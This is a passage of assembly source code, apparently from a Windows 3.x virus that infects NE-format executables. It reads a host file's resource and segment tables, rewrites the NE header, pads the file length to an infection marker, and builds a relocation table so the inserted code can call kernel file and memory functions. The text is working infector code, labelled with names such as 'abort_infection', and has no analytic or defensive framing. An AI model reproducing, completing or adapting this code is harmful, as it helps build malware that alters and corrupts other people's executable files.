		cwde
		push	eax			; lSize
		call	Allocate_Buffer
		mov	wo ss:[bp.ResourceTable_Selector],ax
		movzx	eax,wo ss:[bp.NE_Header.neh_ResourceTable_Ofs]
		add	eax,dwo ss:[bp.NEHeader_FilePos]
		push	wo ss:[bp.FileHandle]	; hFile
		push	eax			; lOffset
		push	0			; iOrigin
		call	a_LLSEEK
		push	wo ss:[bp.FileHandle]	; hFile
		push	wo ss:[bp.ResourceTable_Selector]
		push	0			; lpBuffer
		push	wo ss:[bp.ResourceTable_Length]
		call	a_LREAD
		cmp	ax,wo ss:[bp.ResourceTable_Length]
  _jne_cai_c:	jne	_jne_cai_d
		;
		; Allocate Buffer and Read in Segment Table.
		;
  nres3:	movzx	eax,wo ss:[bp.NE_Header.neh_SegmentTable_Count]
		shl	eax,3
		cmp	eax,0F000h
		ja	abort_infection
		push	ax
		push	eax				; lSize
		call	Allocate_Buffer
		mov	wo ss:[bp.SegmentTable_Selector],ax
		push	wo ss:[bp.FileHandle]		; hFile
		movzx	eax,wo ss:[bp.NE_Header.neh_SegmentTable_Ofs]
		add	eax,dwo ss:[bp.NEHeader_FilePos]
		push	eax				; lOffset
		push	0				; iOrigin
		call	a_LLSEEK
		pop	ax
		push	ax
		push	wo ss:[bp.FileHandle]	; hFile
		push	wo ss:[bp.SegmentTable_Selector]
		push	0			; lpBuffer
		push	ax			; wBytes
		call	a_LREAD	
		pop	bx
		cmp	ax,bx
  _jne_cai_d:	jne	_jne_cai_e
		ret

;----------------------------------------------------------------------------

txtTable:	dw	ofs txt0, ofs txt1, ofs txt2

;----------------------(Write Files NE Header)-------------------------------
;
; Exactly what it says.. nothing fancy like Read_NE_Header..
; 'cept it marks pads filelength to infected..
;
Write_NE_Header:	push	wo ss:[bp.FileHandle]	     ; hFile
			push	dwo ss:[bp.NEHeader_FilePos] ; lOffset
			push	0			     ; iOrigin
			call	a_LLSEEK
			push	wo ss:[bp.FileHandle]	; hFile
			push	ss
			lea	ax,[bp.NE_Header]
			push	ax			; lpBuffer
			push	neh_Size		; wBytes
			call	a_LWRITE
			cmp	ax,neh_Size
	_jne_cai_e:	jne	abort_infection
			push	wo ss:[bp.FileHandle]	; hFile
			push	L 0			; lOffset
			push	2			; iOrigin
			call	a_LLSEEK
			mov	cx,Marker
			div	cx
			neg	dx
			jnc	mp1
			add	dx,cx
			add	wo ss:[bp.MoveSize],dx
			push	wo ss:[bp.FileHandle]	; hFile
			push	ss
			push	bp			; lpBuffer
			push	dx			; wBytes
			call	a_LWRITE
	mp1:		ret

;----------------------(Procedures to CALL various Kernel API Functions)-----

API_call		MACRO	apif

			PUBLIC a&apif&
			a&apif& Proc Near

			pop	ax
			push	cs ax
			jmp 	far ptr apif

			a&apif& ENDP

			ENDM

;		Function Name 		Ordinal
;----------------------------------------------
;
API_call	_LCREAT			; 83
API_call	_LOPEN			; 85
API_call	_LLSEEK			; 84
API_call	_LREAD			; 82
API_call	_LWRITE			; 86
API_call	_LCLOSE			; 81

API_call	GLOBALALLOC		; 15
API_call	GLOBALLOCK		; 18
API_call	GLOBALUNLOCK		; 19
API_call	GLOBALFREE		; 17

API_call	GETMODULEHANDLE		; 47
API_call	GETMODULEFILENAME	; 49
API_call	GETEXEPTR		; 133

;----------------------(Relocations nescessary to CALL Kernel API)-----------

relocation_item	macro	API_call_position, Ordinal

	dw	(ofs API_call_position)+4 ;; position of relocation patch.
	dw	Ordinal ;; Application: API Ordinal, Kernel: API Offset.

        endm

Relocation_Table:
	relocation_item a_LCREAT,		83
	relocation_item	a_LOPEN, 		85
	relocation_item	a_LLSEEK, 		84
	relocation_item	a_LREAD, 		82
	relocation_item	a_LWRITE, 		86
	relocation_item	a_LCLOSE, 		81
	relocation_item	aGLOBALALLOC, 		15
	relocation_item	aGLOBALLOCK, 		18
	relocation_item	aGLOBALUNLOCK, 		19
	relocation_item aGLOBALFREE, 		17
	relocation_item	aGETMODULEHANDLE, 	47
	relocation_item	aGETMODULEFILENAME, 	49
	relocation_item aGETEXEPTR,		133
	relocation_item <aINITTASK - 3>,	91
End_Relocation_Table:
;----------------------------------------------------------------------------
			end	vstart
;============================================================================